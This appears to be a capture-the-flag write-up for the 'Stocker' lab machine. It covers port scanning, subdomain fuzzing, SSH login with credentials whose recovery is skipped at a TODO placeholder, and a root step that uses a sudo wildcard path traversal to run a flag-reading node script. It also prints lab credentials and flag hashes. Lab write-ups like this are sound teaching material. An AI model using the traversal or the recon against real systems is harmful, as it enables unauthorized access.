# Stocker

Let's stat enumerating the system !
```
sudo nmap -sS --open --min-rate 5000 -Pn -n -v 10.10.11.196 -oG allPorts
```
> There's only 2 ports : 22 and 80

Check the version of services !
```
nmap -sC -sV -p22,80 10.10.11.196 -oN targeted
```
> Ther's only a http service and the ssh service

Add the ip address to the ```/etc/hosts``` file
```
10.10.11.196    stocker.htb
```

Let's check the web !
```
whatweb http://stocker.htb
```

Seeing the web, there's nothing interessing... Let's fuzz DNS or paths !
```
wfuzz -c -t 400 --hc=404 -w /usr/share/dirbuster/directory-list-2.3-medium.txt http://stocker.htb/FUZZ
```
> For discovering other paths, but nothing...

Let's discover sub domains (DNS)
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
```

We found a subdomain !
```
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
```

Add this sub domain to the ```/etc/hosts``` !
```
10.10.11.196    stocker.htb     dev.stocker.htb
```


# TODO finish the Burpsuite attack



We get the user and passwd
```
user: angoose
pass: IHeardPassphrasesArePrettySecure
```
Let's connect to the ssh
```
ssh angoose@stocker.htb
```

Running a ```ls``` command, we see the ```user.txt``` file !
```
3fc9a0d07963dc417fceaae26c33001f
```

Let's check the privilegs by
```
sudo -l
```

The output is:
```
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```
> That means we can execute ```javascript``` file ! 

Use the following script ([flag.js](./exploits/flag.js)) to read the ```root.txt``` flag
```
const fs = require ('fs');
fs.readFile('/root/root.txt', 'utf-8', (err, data) => {
    if (err) throw err;
     console.log(data);
});
```

Then, let's execute it as root !
```
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/flag.js
```

We got the flag !
```
ec5b4efcbec8fbd36163d73640d1db07
```
